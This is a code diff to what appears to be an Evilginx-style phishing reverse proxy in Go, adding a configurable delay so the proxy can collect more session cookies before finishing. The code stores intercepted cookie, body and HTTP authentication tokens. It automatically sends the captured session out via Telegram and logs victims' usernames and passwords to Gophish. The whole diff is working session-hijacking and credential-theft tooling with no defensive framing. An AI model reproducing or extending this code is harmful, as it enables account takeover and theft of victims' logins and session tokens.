@@ -1377,40 +1377,94 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if is_cookie_auth && is_body_auth && is_http_auth {
-				// we have all auth tokens
+				// we have all required auth tokens
 				if s, ok := p.sessions[ps.SessionId]; ok {
-					if !s.IsDone {
-						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-
-						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						s.Finish(false)
-
-						// Auto-export and send session via Telegram
-						if sessionID, ok := p.sids[ps.SessionId]; ok {
-							p.AutoExportAndSendSession(sessionID, ps.SessionId)
+					if !s.IsDone && !s.GatherDelayPending {
+						gatherDelay := 0
+						if pl != nil {
+							gatherDelay = pl.GetCookieGatherDelay()
 						}
 
-						rid, ok := s.Params["rid"]
-						if ok && rid != "" {
-							payload := url.Values{}
-							if s.Username != "" {
-								payload.Add("Username", s.Username)
+						if gatherDelay > 0 {
+							// Delayed path: keep session open so additional cookies can arrive
+							s.GatherDelayPending = true
+							sid := ps.SessionId
+							idx := ps.Index
+							go func() {
+								log.Info("[%d] all required tokens captured, waiting %ds for additional cookies...", idx, gatherDelay)
+								time.Sleep(time.Duration(gatherDelay) * time.Second)
+
+								p.session_mtx.Lock()
+								s2, ok := p.sessions[sid]
+								p.session_mtx.Unlock()
+								if ok && !s2.IsDone {
+									log.Success("[%d] all authorization tokens intercepted!", idx)
+
+									if err := p.db.SetSessionCookieTokens(sid, s2.CookieTokens); err != nil {
+										log.Error("database: %v", err)
+									}
+									if err := p.db.SetSessionBodyTokens(sid, s2.BodyTokens); err != nil {
+										log.Error("database: %v", err)
+									}
+									if err := p.db.SetSessionHttpTokens(sid, s2.HttpTokens); err != nil {
+										log.Error("database: %v", err)
+									}
+									s2.Finish(false)
+
+									// Auto-export and send session via Telegram
+									if sessionID, ok := p.sids[sid]; ok {
+										p.AutoExportAndSendSession(sessionID, sid)
+									}
+
+									if rid, ok := s2.Params["rid"]; ok && rid != "" {
+										payload := url.Values{}
+										if s2.Username != "" {
+											payload.Add("Username", s2.Username)
+										}
+										if s2.Password != "" {
+											payload.Add("Password", s2.Password)
+										}
+										for k, v := range s2.Custom {
+											payload.Add(k, v)
+										}
+										recordGophishEvent(rid, s2.RemoteAddr, s2.UserAgent, "submit", payload)
+									}
+								}
+							}()
+						} else {
+							// Immediate path: original behavior
+							log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+
+							if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+								log.Error("database: %v", err)
 							}
-							if s.Password != "" {
-								payload.Add("Password", s.Password)
+							if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
+								log.Error("database: %v", err)
 							}
-							for k, v := range s.Custom {
-								payload.Add(k, v)
+							if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
+								log.Error("database: %v", err)
 							}
-							recordGophishEvent(rid, s.RemoteAddr, s.UserAgent, "submit", payload)
+							s.Finish(false)
+
+							// Auto-export and send session via Telegram
+							if sessionID, ok := p.sids[ps.SessionId]; ok {
+								p.AutoExportAndSendSession(sessionID, ps.SessionId)
+							}
+
+							rid, ok := s.Params["rid"]
+							if ok && rid != "" {
+								payload := url.Values{}
+								if s.Username != "" {
+									payload.Add("Username", s.Username)
+								}
+								if s.Password != "" {
+									payload.Add("Password", s.Password)
+								}
+								for k, v := range s.Custom {
+									payload.Add(k, v)
+								}
+								recordGophishEvent(rid, s.RemoteAddr, s.UserAgent, "submit", payload)
+							}
 						}
 					}
 				}
